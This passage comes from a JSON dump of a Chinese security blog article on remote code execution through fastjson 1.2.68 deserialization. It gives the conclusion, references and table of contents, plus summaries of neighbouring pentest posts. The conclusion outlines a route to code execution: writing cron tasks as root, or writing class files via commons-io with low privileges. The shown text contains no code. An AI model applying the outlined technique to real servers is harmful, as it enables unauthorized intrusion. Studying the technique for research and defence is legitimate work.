title=\"最后\"></a>最后</h2><p>  在root权限下可以直接通过commons-io链写计划任务，低权限下通过写class文件rce，获取jdk目录、创建classes目录仅依赖commons-io，但是写入class文件需要更多不太常见的依赖，总的来讲利用条件还是较为苛刻的。</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><ol>\n<li>Fastjson 1.2.68 反序列化漏洞 Commons IO 2.x 写文件利用链挖掘分析(<a href=\"https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg\">https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg</a>)</li>\n<li>Blackhat 2021 议题详细分析 —— FastJson 反序列化漏洞及在区块链应用中的渗透利用(<a href=\"https://paper.seebug.org/1698/#3commons-io\">https://paper.seebug.org/1698/#3commons-io</a>)</li>\n<li>fastjson 读文件 gadget 的利用场景扩展(<a href=\"https://b1ue.cn/archives/506.html\">https://b1ue.cn/archives/506.html</a>)</li>\n<li>JDK8任意文件写场景下的Fastjson RCE(<a href=\"https://threedr3am.github.io/2021/04/13/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84Fastjson%20RCE/\">https://threedr3am.github.io/2021/04/13/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84Fastjson%20RCE/</a>)</li>\n</ol></blockquote>\n","text":"fastjson 1.2.68 反序列化rce探索前言 fastjson 1.2.68 目前公开的利用链中比较好用的是voidfyoo师傅的Commons IO 写文件链子，但是在spring环境下，仅仅通过写文件rce较为困难，本文更多的是结合多位师傅的文章理出一条通过写文件稳定rce方法 JDK8任意文件写场景下的Fastjson RCE 通过覆盖charsets.jar缺点太多，一是文件大，二是java版本不适配。另外笔者觉得还有一个致命因素，一般来说项目中只要使用了Charset.for...","link":"","photos":[],"count_time":{"symbolsCount":"8.5k","symbolsTime":"8 mins."},"categories":[{"name":"渗透测试","slug":"渗透测试","count":10,"path":"api/categories/渗透测试.json"}],"tags":[{"name":"渗透测试","slug":"渗透测试","count":3,"path":"api/tags/渗透测试.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#fastjson-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce%E6%8E%A2%E7%B4%A2\"><span class=\"toc-text\">fastjson 1.2.68 反序列化rce探索</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84Fastjson-RCE\"><span class=\"toc-text\">JDK8任意文件写场景下的Fastjson RCE</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%8E%B7%E5%8F%96jdk%E7%9B%AE%E5%BD%95\"><span class=\"toc-text\">获取jdk目录</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%88%9B%E5%BB%BAclasses%E7%9B%AE%E5%BD%95\"><span class=\"toc-text\">创建classes目录</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%86%99%E5%85%A5class%E6%96%87%E4%BB%B6\"><span class=\"toc-text\">写入class文件</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%9C%80%E5%90%8E\"><span class=\"toc-text\">最后</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83\"><span class=\"toc-text\">参考</span></a></li></ol></li></ol>","author":{"name":"COP","slug":"cop","avatar":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220721/cop.3c6tiszrlxs0.jpg","link":"https://rainsec.cn","description":"","socials":{}},"mapped":true,"prev_post":{"title":"Goby指纹与POC提取复现","uid":"84026449195101da50b0cdf96b2a3940","slug":"Goby指纹和POC提取","date":"2022-09-30T02:48:45.000Z","updated":"2023-04-11T11:39:24.009Z","comments":true,"path":"api/articles/Goby指纹和POC提取.json","keywords":null,"cover":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220930/image.x02df1872g.webp","text":"Goby指纹与POC提取复现最近看了w8ay师傅发的关于提取Goby指纹的帖子，发现自己加入师傅的知识星球却一直没认真学习过实在是难顶嗷，根据师傅的帖子来复现自己提取一下，补上第一期的作业。 Goby指纹提取首先是指纹提取，这里也分别准备了三个版本的Goby文件进行复现，分别是1.4.76、1.7.192和1.8.279 1.4.76因为版本比较低所以不需要我们手动去从goby程序里提crules，直接用winhex打开笔者从事的工作与Yara息息相关，但是从来没有深入的去了解Yara的原理和流...","link":"","photos":[],"count_time":{"symbolsCount":"5.7k","symbolsTime":"5 mins."},"categories":[{"name":"渗透测试","slug":"渗透测试","count":10,"path":"api/categories/渗透测试.json"}],"tags":[{"name":"渗透测试","slug":"渗透测试","count":3,"path":"api/tags/渗透测试.json"}],"author":{"name":"Zitui","slug":"zitui","avatar":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/zitui_logo.jpg","link":"https://rainsec.cn","description":"","socials":{}}},"next_post":{"title":"一次攻防小记","uid":"caead448310a4a1bf0047aa168443e2c","slug":"一次攻防小记","date":"2022-08-24T10:38:45.000Z","updated":"2023-04-11T11:38:25.117Z","comments":true,"path":"api/articles/一次攻防小记.json","keywords":null,"cover":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220824/scan.6q7shyuek6k0.png","text":"一次攻防小记​ 一次攻防，第一天师傅rmi直接进了总公司内网，笔者在核心资产段打了好久没能进去，水了几天边缘分公司，队长又让打核心段，看看之前的一些弱口令，后台能不能后续利用，没办法硬着头皮打。​ 这个弱口令属于那种爆破可以爆破出的，但是随手试肯定不会试的，后台功能点比较多，但是生产也不敢乱动，之前师傅进后台挖过，找到了个跨目录上传和文件读取（都仅限jpg后缀），笔者经过细挖，找到个sql注入（mysql，支持堆叠，mysql用户权限较低）和fastjson（1.2.47&lt;版本&lt;1....","link":"","photos":[],"count_time":{"symbolsCount":"3.7k","symbolsTime":"3 mins."},"categories":[{"name":"渗透测试","slug":"渗透测试","count":10,"path":"api/categories/渗透测试.json"}],"tags":[{"name":"渗透测试","slug":"渗透测试","count":3,"path":"api/tags/渗透测试.json"}],"author":{"name":"COP","slug":"cop","avatar":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220721/cop.3c6tiszrlxs0.jpg","link":"https://rainsec.cn","description":"","socials":{}}}}